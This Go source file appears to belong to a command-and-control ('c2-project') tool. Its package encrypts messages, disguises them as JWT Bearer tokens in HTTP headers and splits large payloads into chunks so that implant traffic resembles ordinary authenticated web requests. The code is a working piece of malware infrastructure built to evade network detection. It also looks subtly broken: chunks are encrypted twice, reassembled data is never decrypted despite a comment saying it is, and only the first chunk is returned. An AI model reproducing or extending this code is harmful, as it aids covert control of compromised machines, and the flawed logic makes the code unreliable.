// Package protocol реализует кодирование/декодирование данных для передачи по HTTP.
// Данные шифруются, маскируются под JWT-токены и фрагментируются.
package protocol

import (
	"c2-project/internal/chunk"
	"c2-project/internal/crypto"
	"c2-project/internal/jwt"
	"encoding/json"
	"fmt"
)

const (
	// MaxChunkSize - максимальный размер одного чанка (1KB)
	MaxChunkSize = 1024
)

// EncodeRequest - кодирует данные в JWT-токен
// Если данные большие, они разбиваются на чанки и возвращаются все
func EncodeRequest(data interface{}) (string, error) {
	// Сериализуем данные в JSON
	jsonData, err := json.Marshal(data)
	if err != nil {
		return "", err
	}

	// Шифруем данные
	encrypted, err := crypto.Encrypt(jsonData)
	if err != nil {
		return "", err
	}

	// Если данные небольшие — отправляем как есть
	if len(encrypted) <= MaxChunkSize {
		token, err := jwt.Encode(encrypted)
		if err != nil {
			return "", err
		}
		return "Bearer " + token, nil
	}

	// Большие данные — разбиваем на чанки
	chunks, sessionID := chunk.Split(encrypted, MaxChunkSize)
	if len(chunks) == 0 {
		return "", fmt.Errorf("failed to split data into chunks")
	}

	// Сохраняем сессию в хранилище
	chunk.SaveSession(sessionID, chunks)

	// Возвращаем все чанки (сохраняем в сессии для последовательной отправки)
	// Возвращаем первый чанк для совместимости с существующей логикой
	chunkData, _ := json.Marshal(chunks[0])
	chunkEncrypted, _ := crypto.Encrypt(chunkData)
	token, err := jwt.Encode(chunkEncrypted)
	if err != nil {
		return "", err
	}
	return "Bearer " + token, nil
}

// DecodeRequest - декодирует данные из Bearer JWT-токена
// Поддерживает как обычные сообщения, так и фрагментированные
func DecodeRequest(authHeader string) (interface{}, error) {
	// Извлекаем данные из JWT
	encrypted, err := jwt.ParseBearerToken(authHeader)
	if err != nil {
		return nil, err
	}

	// Расшифровываем данные
	decrypted, err := crypto.Decrypt(encrypted)
	if err != nil {
		return nil, err
	}

	// Пробуем распарсить как чанк
	var c chunk.Chunk
	if err := json.Unmarshal(decrypted, &c); err == nil && c.Type != "" {
		// Это чанк — собираем данные
		result, completed := chunk.Assemble(c)
		if completed {
			// Все чанки собраны — расшифровываем результат
			var finalResult map[string]interface{}
			if err := json.Unmarshal([]byte(result), &finalResult); err != nil {
				return nil, err
			}
			return finalResult, nil
		}
		// Не все чанки получены
		return map[string]interface{}{
			"status":  "assembling",
			"session": c.ID,
		}, nil
	}

	// Обычное сообщение (не чанк)
	var result map[string]interface{}
	if err := json.Unmarshal(decrypted, &result); err != nil {
		return nil, err
	}
	return result, nil
}
